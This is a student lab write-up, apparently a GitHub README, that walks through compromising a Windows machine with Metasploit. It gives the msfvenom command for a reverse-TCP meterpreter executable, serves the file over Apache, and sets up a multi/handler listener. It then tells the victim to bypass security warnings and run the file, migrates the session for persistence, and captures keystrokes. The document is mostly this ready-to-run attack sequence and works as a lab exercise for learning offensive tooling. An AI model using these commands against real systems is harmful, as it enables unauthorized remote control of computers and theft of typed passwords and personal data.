# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/606e3364-b0b9-43b5-9250-795b7598c04e)



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/5dc05fce-63a2-47f9-b694-746b22ba200d)





copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/480f5425-ce40-497b-8b25-b7ad72bbaed8)



Start apache server
sudo systemctl apache2 start

![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/9d9a575a-d0d4-4463-adf7-ee84feedd93b)




Check the status of apache2
![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/15c93b77-e16e-4fb1-9b41-6a7aeb1cd19b)




Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/f96bb7a2-4ba8-42d1-8c0e-f8f834e34bdc)




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/17e4e8a1-f58e-422e-abd4-b79905434188)



Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/ae0f8e8c-f937-4ab1-85ad-1971688afc40)



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/f6588fa0-2bf1-422e-a42f-cf7d687385a6)




Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/5409594d-f21d-4c89-9c27-7e3c5cc2ee27)




keyscan_dump	Shows the keystrokes captured so far
![image](https://github.com/JivanKarthick/Compromising-windows-using-Metasploit/assets/121165867/ea183567-a808-4dd4-81ca-9d782aae245c)






## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
